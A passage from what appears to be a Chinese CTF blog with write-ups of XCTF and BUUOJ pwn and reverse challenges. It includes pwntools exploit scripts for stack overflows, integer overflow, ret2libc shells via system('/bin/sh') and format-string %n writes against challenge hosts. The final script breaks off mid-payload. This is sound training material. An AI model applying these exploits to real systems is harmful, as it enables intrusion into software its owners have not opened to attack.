loc_80486D3<br>.text:080486BD<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> offset<span class="hljs-title"> format</span> ; &quot;%s&quot;<br>.text:080486C2<span class="hljs-title">                 lea</span> <span class="hljs-title">    edx,</span> [ebp+var_13]<br>.text:080486C5<span class="hljs-title">                 mov</span>     [esp+4],<span class="hljs-title"> edx</span><br>.text:080486C9<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> eax</span>      ;<span class="hljs-title"> format</span><br>.text:080486CC<span class="hljs-title">                 call</span> <span class="hljs-title">   _printf</span><br>.text:080486D1<span class="hljs-title">                 jmp</span> <span class="hljs-title">    short</span> locret_80486E0<br></code></pre></td></tr></table></figure><p>整理出来得到</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[eax+var_19]</span>=2*<span class="hljs-comment">[eax+arg_0+1]</span><br><span class="hljs-comment">[ebp+var_18]</span>=<span class="hljs-comment">[eax+arg_0+4]</span>+<span class="hljs-comment">[eax+arg_0+5]</span><br><span class="hljs-comment">[ebp+var_17]</span>=<span class="hljs-comment">[eax+arg_0+8]</span>+<span class="hljs-comment">[eax+arg_0+9]</span><br><span class="hljs-comment">[ebp+var_16]</span>=2*<span class="hljs-comment">[eax+arg_0+12]</span><br><span class="hljs-comment">[ebp+var_15]</span>=<span class="hljs-comment">[eax+arg_0+17]</span>+<span class="hljs-comment">[eax+arg_0+18]</span><br><span class="hljs-comment">[ebp+var_14]</span>=<span class="hljs-comment">[eax+arg_0+10]</span>+<span class="hljs-comment">[eax+arg_0+21]</span><br><span class="hljs-comment">[ebp+var_13]</span>=<span class="hljs-comment">[eax+arg_0+9]</span>+<span class="hljs-comment">[eax+arg_0+25]</span><br><span class="hljs-comment">[ebp+var_12]</span>=0<br></code></pre></td></tr></table></figure><p>只要找到传进来的eax+arg_0是谁就可以解除这道题，有下标25的数组，只能猜测是buf或者是pipe[1],先尝试pipe[1]，我先尝试了下按照左边的地址大小找flag写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;69800876143568214356928753&#x27;</span><br>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>,a))<br>flag = <span class="hljs-string">&quot;&quot;</span><br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">9</span>]+a[<span class="hljs-number">25</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">10</span>]+a[<span class="hljs-number">21</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">17</span>]+a[<span class="hljs-number">18</span>])<br>flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span>*a[<span class="hljs-number">12</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">8</span>]+a[<span class="hljs-number">9</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">4</span>]+a[<span class="hljs-number">5</span>])<br>flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span>*a[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#得到值gehlehr，输入后发现不对。</span><br></code></pre></td></tr></table></figure><p>又尝试了下反着输入，得到了flag</p><p>有没有哪位同志可以解释下linux下gdb调试怎么才可以结束输入wwww,以后还是尝试用ida调试elf文件吧qaq</p><h1 id="xctf-pwn-level0">xctf pwn level0</h1><p>第一次做pwn题，题目就是简单的栈溢出，当允许写入的量超过了堆栈的就可以覆盖返回地址，从而让地址回到自己想要的地方</p><figure><img src="https://s2.loli.net/2022/04/02/wJp4kgStd3HlcBX.png"alt="屏幕截图 2022-04-02 124518" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 124518</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/tbx24PnNFO6qLk1.png"alt="屏幕截图 2022-04-02 124528" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 124528</figcaption></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.222&quot;</span>,<span class="hljs-number">58857</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">136</span>+p64(<span class="hljs-number">0x0040059A</span>)<br>a.send(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="xctf-pwn-level2">xctf pwn level2</h1><figure><img src="https://s2.loli.net/2022/04/08/skNXIUP6cgSW9AF.png"alt="屏幕截图 2022-03-24 231138" /><figcaption aria-hidden="true">屏幕截图 2022-03-24 231138</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/6TVIYjS1ux45F3W.png"alt="屏幕截图 2022-03-24 231201" /><figcaption aria-hidden="true">屏幕截图 2022-03-24 231201</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/1VJxmnqko7TzNt9.png"alt="屏幕截图 2022-03-24 231313" /><figcaption aria-hidden="true">屏幕截图 2022-03-24 231313</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/JcIK8yeQ3vjE4SA.png"alt="屏幕截图 2022-03-24 231725" /><figcaption aria-hidden="true">屏幕截图 2022-03-24 231725</figcaption></figure><h1 id="xctf-pwn-guess_number">xctf pwn guess_number</h1><p>gets(&amp;)漏洞，加上伪随机数。伪随机数的一个特点就是，只要我们将种子固定，那么它生成的随机数就是固定的。于是我们只要覆盖随机种子将它改成我们想要的种子即可，正好程序的v7数组的栈地址就在种子的上面。</p><figure><img src="https://s2.loli.net/2022/04/08/CsomKFtd4eMz6V9.png"alt="屏幕截图 2022-04-02 124944" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 124944</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/xbpOwuJalKd3DCz.png"alt="屏幕截图 2022-04-02 125028" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 125028</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/jxW46YmVycpAnLf.png"alt="屏幕截图 2022-03-24 232138" /><figcaption aria-hidden="true">屏幕截图 2022-03-24 232138</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/Ul1AuB53oJdmnEP.png"alt="屏幕截图 2022-03-24 232155" /><figcaption aria-hidden="true">屏幕截图 2022-03-24 232155</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/l2MWxZ5DurAQhOY.png"alt="屏幕截图 2022-03-24 232208" /><figcaption aria-hidden="true">屏幕截图 2022-03-24 232208</figcaption></figure><h1 id="buuoj-pwn-ciscn_2019_n_1">buuoj pwn ciscn_2019_n_1</h1><figure><img src="https://s2.loli.net/2022/04/08/2KrZBMJloS5ezQI.png"alt="屏幕截图 2022-03-27 162049" /><figcaption aria-hidden="true">屏幕截图 2022-03-27 162049</figcaption></figure><p>这道题很简单，利用gets函数可以无限输入的漏洞，把v1的栈溢出到v2，将v2的值改成题目要求的值，但我这里犯了个错误，我最开始的时候是想直接把v1,v2的栈直接溢出，然后覆盖原有的地址，直接返回到调用system("cat")的地址执行，结果写exp执行后一直timeout，后来才想到把把v1的栈溢出改v2的值。</p><p>要想让v2的值等于11.825，要先找到11.825的16进制值，因为11.825在内存中是以16进制形式存储的。找到后就可以直接写exp了。</p><figure><img src="E:\屏幕截图\屏幕截图%202022-03-27%20162817.png"alt="屏幕截图 2022-03-27 162817" /><figcaption aria-hidden="true">屏幕截图 2022-03-27 162817</figcaption></figure><figure><img src="E:\屏幕截图\屏幕截图%202022-03-27%20162832.png"alt="屏幕截图 2022-03-27 162832" /><figcaption aria-hidden="true">屏幕截图 2022-03-27 162832</figcaption></figure><h1 id="jarvisoj_level0-buuoj-pwn">jarvisoj_level0 buuoj pwn</h1><p>基础的栈溢出问题，打开关键函数发现，可以写入的量超过了栈，于是可以覆盖返回地址</p><figure><img src="https://s2.loli.net/2022/04/08/xYinmkDd4MwXVPb.png"alt="屏幕截图 2022-03-28 135327" /><figcaption aria-hidden="true">屏幕截图 2022-03-28 135327</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/24RceGXmS7b8dys.png"alt="屏幕截图 2022-03-28 135343" /><figcaption aria-hidden="true">屏幕截图 2022-03-28 135343</figcaption></figure><h1 id="xctf-int-overflow">xctf int overflow</h1><p>这题看题目就知道可以利用int的溢出，当数据超过int型的最大范围时，就会溢出变为负数的最大值</p><figure><img src="https://s2.loli.net/2022/04/08/3caQN7M6dX4Fk2A.png"alt="屏幕截图 2022-04-02 130558" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 130558</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/HJZBaVd5sx97CyX.png"alt="屏幕截图 2022-04-02 130548" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 130548</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/dfZuW9NerCSDO3L.png"alt="屏幕截图 2022-04-02 130539" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 130539</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/odzHA1EOWvgXUrF.png"alt="屏幕截图 2022-04-02 130858" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 130858</figcaption></figure><p>于是我们只要将buf的长度更改为258-266之间，并且在buf的前面把dest的栈溢出即可</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-number">54577</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please input your username:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;123&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please input your passwd:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p32(<span class="hljs-number">0x08048694</span>)<br>a.sendline(payload.ljust(<span class="hljs-number">260</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-ciscn_2019_c_1">buuoj ciscn_2019_c_1</h1><p>checksec后发现是标准的ret2libc题目，但是这个程序是64位的，在构造payload获得puts的地址方式有差别</p><p>64位：覆盖栈+.got+.plt+main的地址</p><p>32位：覆盖栈+.plt+main的地址+.got</p><p>然后此题的环境还是ubuntu18，Ubuntu18以上后在构造栈溢出后需要堆栈平衡，就必须引入pop_rdi_ret</p><figure><img src="https://s2.loli.net/2022/04/08/i9RMjdFw1O7Uyeh.png" alt="1" /><figcaption aria-hidden="true">1</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/m2YQHTCEdygw5bi.png" alt="2" /><figcaption aria-hidden="true">2</figcaption></figure><p>于是就可以写payload了，但是我的exp卡在了puts_addr=u64(a.recv(7)[:-1].ljust(8,b''))这里，看了别人的exp才知道在这前面还要再吃个回车，我也不知道为啥，是因为puts(s)?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26328</span>)<br>elf=ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>main_addr=<span class="hljs-number">0x00400B28</span><br>pop_rdi_ret=<span class="hljs-number">0x400c83</span><br>a.recvuntil(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x08</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<span class="hljs-comment">#unbuntu有堆栈平衡，需要加pop_rdi_ret，之前一直payload构造不上去</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Ciphertext\n&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#卡在这里了wwww,最后这里还是看了wp</span><br>puts_addr=u64(a.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libcbase+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x08</span>+p64(<span class="hljs-number">0x00400C1C</span>)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)<br>a.sendline(payload2)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="xctf-pwn-cgfsb">xctf pwn cgfsb</h1><p>本题利用的是格式化字符串的漏洞来进行解题</p><p>相关知识：</p><blockquote><p><ahref="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1格式化字符串漏洞 · CTF All In One (gitbooks.io)</a></p><p><ahref="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_9">FormatString - CTF Wiki (ctf-wiki.org)</a></p><p><strong>要点</strong>：</p><ol type="1"><li><p>根据 cdecl 的调用约定，在进入 <code>printf()</code>函数之前，将参数从右到左依次压栈。进入 <code>printf()</code>之后，函数首先获取第一个参数，一次读取一个字符。如果字符不是<code>%</code>，字符直接复制到输出中。否则，读取下一个非空字符，获取相应的参数并解析输出。（注意：<code>% d</code>和 <code>%d</code> 是一样的）</p></li><li><p>在进入 printf之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p></li></ol><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>那么假设，此时我们在编写程序时候，写成了下面的样子</p><p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&gt;<span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure></p><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol type="1"><li><p>解析其地址对应的字符串</p></li><li><p>解析其内容对应的整形值</p></li><li><p>解析其内容对应的浮点值</p></li><li><p>```c //源码 #include&lt;stdio.h&gt; void main() { charformat[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] ="ABCD"; scanf("%s", format); printf(format, arg1, arg2, arg3, arg4);printf(""); } <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">[------------------------------------stack-------------------------------------]<br>0000| 0xffffd550 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0004| 0xffffd554 --&gt; 0x1<br>0008| 0xffffd558 --&gt; 0x88888888<br>0012| 0xffffd55c --&gt; 0xffffffff<br>0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)<br>0020| 0xffffd564 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)<br>0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x56555642 in main ()<br></code></pre></td></tr></table></figure></p></li></ol><p>格式字符串的地址在<code>0xffffd584</code>，从下面的输出中可以看到它们在栈中是怎样排布的：</p><p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ x/20w $esp<br>&gt;0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff<br>&gt;0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7<br>&gt;0xffffd570:     0xf7ffda54      0x00000001      0x424135d0      0x00004443<br>&gt;0xffffd580:     0x00000000      0x41414141      0x2e70252e      0x252e7025<br>&gt;0xffffd590:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70<br>&gt;gdb-peda$ x/20wb 0xffffd584<br>&gt;0xffffd584:     0x41    0x41    0x41    0x41    0x2e    0x25    0x70    0x2e<br>&gt;0xffffd58c:     0x25    0x70    0x2e    0x25    0x70    0x2e    0x25    0x70<br>&gt;0xffffd594:     0x2e    0x25    0x70    0x2e<br>&gt;gdb-peda$ python print(&#x27;\x2e\x25\x70&#x27;)<br>&gt;.%p<br></code></pre></td></tr></table></figure></p><p>下面是程序运行的结果：</p><p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ c<br>&gt;Continuing.<br>&gt;AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e<br></code></pre></td></tr></table></figure></p><p><code>0x41414141</code> 是输出的第 13 个字符，所以我们使用<code>%13$s</code> 即可读出 <code>0x41414141</code>处的内容，当然，这里可能是一个不合法的地址。只要将0x41414141改成有效地址就可以任意地址的访问</p><ol start="4" type="1"><li>%$n可以将当前已经写入的字符个数赋值给所给的地址</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/04/08/rOqGw3Eit6759Nn.png"alt="屏幕截图 2022-03-30 170255" /><figcaption aria-hidden="true">屏幕截图 2022-03-30 170255</figcaption></figure><p>根据前面对于格式化字符串漏洞的学习，我们可以找到pwn的地址，对其进行覆盖，pwnme位于bss区域，地址不会更改，所以我们只要找到printf的偏移量就可以写exp了</p><figure><img src="E:\屏幕截图\屏幕截图%202022-03-30%20170311.png"alt="屏幕截图 2022-03-30 170311" /><figcaption aria-hidden="true">屏幕截图 2022-03-30 170311</figcaption></figure><p>可以知道偏移量为10</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-number">55080</span>)<br>a.sendlineafter(<span class="hljs-string">&quot;please tell me your name:&quot;</span>,<span class="hljs-number">123</span>)<br>payload=p32(<span class="hljs-number">0x0804A068</span>)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+<span class="hljs-string">b&#x27;%10$n&#x27;</span><br>a.recvuntil(<span class="hljs-string">&quot;leave your message please:&quot;</span>)<br>a.sendline(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="xctf-pwn-hello_pwn">xctf pwn hello_pwn</h1><figure><img src="https://s2.loli.net/2022/04/08/zdgE82cBWfQeMku.png"alt="屏幕截图 2022-03-30 171747" /><figcaption aria-hidden="true">屏幕截图 2022-03-30 171747</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/A7Tz5ZsiQI1bqRH.png"alt="屏幕截图 2022-03-30 171810" /><figcaption aria-hidden="true">屏幕截图 2022-03-30 171810</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/08/T5uvUNApWwHFISn.png"alt="屏幕截图 2022-03-30 171818" /><figcaption aria-hidden="true">屏幕截图 2022-03-30 171818</figcaption></figure><figure><img src="https://s2.loli.net/2022/03/30/Msaxd9lwcbtTqBm.png"alt="屏幕截图 2022-03-30 171848" /><figcaption aria-hidden="true">屏幕截图 2022-03-30 171848</figcaption></figure><h1 id="buuoj-pwn-pwn5">buuoj pwn pwn5</h1><p>首先先checksec一下程序，发现不可栈溢出和NX。打开ida分析下</p><figure><img src="https://s2.loli.net/2022/04/02/WpaekqIwEZV52z3.png"alt="屏幕截图 2022-04-02 154600" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 154600</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/02/XEz6VNvgWYpACwK.png"alt="屏幕截图 2022-04-02 154619" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 154619</figcaption></figure><p>同时判断的关键数据的地址正好位于bss段，地址不会更改。于是可以利用格式化输出的漏洞</p><figure><img src="https://s2.loli.net/2022/04/02/uEwVZXh6FgD4PSf.png"alt="屏幕截图 2022-04-02 154744" /><figcaption aria-hidden="true">屏幕截图 2022-04-02 154744</figcaption></figure><p>发现偏移量位10，于是可以写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28470</span>)<br>a.recvuntil(<span class="hljs-string">&quot;your name:&quot;</span>)<br>payload=p32(<span class="hljs-number">0x0804C044</span>)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+<span class="hljs-string">b&#x27;%10$n&#x27;</span><br>a.sendline(payload)<br>a.recvuntil(<span class="hljs-string">&quot;your passwd:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;8&#x27;</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-pwn-ciscn_2019_n_8">buuoj pwn ciscn_2019_n_8</h1><p>scanf("%s")既提供了首地址，然后又没有限制输入的长度，可以利用这个来进行栈覆盖</p><figure><img src="https://s2.loli.net/2022/04/03/CSmyes4dUzc1i8k.png"alt="屏幕截图 2022-04-03 144825" /><figcaption aria-hidden="true">屏幕截图 2022-04-03 144825</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/03/ZzBFN1hXi84IKRC.png"alt="屏幕截图 2022-04-03 144740" /><figcaption aria-hidden="true">屏幕截图 2022-04-03 144740</figcaption></figure><h1 id="buuoj-pwn-babyrop">buuoj pwn babyrop</h1><p>首先打开ida分析下程序运行方式</p><figure><img src="https://s2.loli.net/2022/04/03/HZDy21KIEf986LF.png"alt="屏幕截图 2022-04-03 160816" /><figcaption aria-hidden="true">屏幕截图 2022-04-03 160816</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/03/sp7W5MItrBYvwEj.png"alt="屏幕截图 2022-04-03 160827" /><figcaption aria-hidden="true">屏幕截图 2022-04-03 160827</figcaption></figure><figure><img src="https://s2.loli.net/2022/04/03/BxicPIzN45TlebU.png"alt="屏幕截图 2022-04-03 160837" /><figcaption aria-hidden="true">屏幕截图 2022-04-03 160837</figcaption></figure><p>程序先从文件里读入数据，然后让我们输入字符串，并进行比较，如果一样就可以继续操作，然后就可以利用栈溢出来得到libc,从而解决问题。</p><p><strong>因为我们不知道程序读入的数据是多少，于是我们只能修改我们输入的值，让它对比通过，可以直接将字符串截断，因为是空字符串，于是肯定能比较成功，在payload中""可以截断字符串，然后再将buf[7]取最大值就行了""(255)</strong></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a= remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29138</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc_32.so.6&quot;</span>)<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=<span class="hljs-number">0x08048825</span><br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span> <span class="hljs-comment">#\x00直接截断字符串，于是可以跳过字符串对比 \xff=255这样超过了buf的大小于是可以栈溢出</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xeb</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">0</span>)+p32(write_got)<br>a.sendline(payload2)<br>write_addr=u32(a.recv(<span class="hljs-number">4</span>))<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh_addr=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span> <span class="hljs-comment">#\x00直接截断字符串，于是可以跳过字符串对比 \xff=255这样超过了buf的大小于是可以栈溢出</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span 